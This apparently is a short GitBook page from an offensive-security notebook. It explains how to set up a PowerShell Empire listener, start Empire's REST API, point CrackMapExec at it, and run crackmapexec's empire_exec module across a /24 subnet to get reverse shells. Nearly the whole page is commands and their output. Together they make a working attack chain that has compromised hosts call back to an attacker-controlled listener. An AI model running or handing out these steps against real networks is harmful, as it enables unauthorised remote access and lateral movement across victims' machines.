---
description: >-
  Integrate CrackMapExec with Empire Impacket stager, and get reverse shells
  like a boss.
cover: ../.gitbook/assets/GitBook Covers (1).png
coverY: 0
---

# 🟢 CME Reverse Shell with Empire

### Configure Empire Listener

```
(Empire: listeners) > set Name test
(Empire: listeners) > set Host 192.168.20.3
(Empire: listeners) > set Port 9090
(Empire: listeners) > set CertPath data/empire-cert.pem
(Empire: listeners) > run
(Empire: listeners) > list

[*] Active listeners:

 ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
 --    ----              ----                                 -------   ------------   --------    ---------------
 1     rfs_test              http://192.168.20.3:9090                 native    5/0.0

(Empire: listeners) >
```

### Start Empire Listener

```
python empire --rest --user empireadmin --pass Password123!
```

Configure CrackMapExec Empire Option

```
vi ~/.cme/cme.conf:
```

```
[Empire]
api_host=127.0.0.1
api_port=1337
username=empireadmin
password=Password123!
```

### Run CrackMapExec with Empire Module

```
crackmapexec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=rfs_test
```
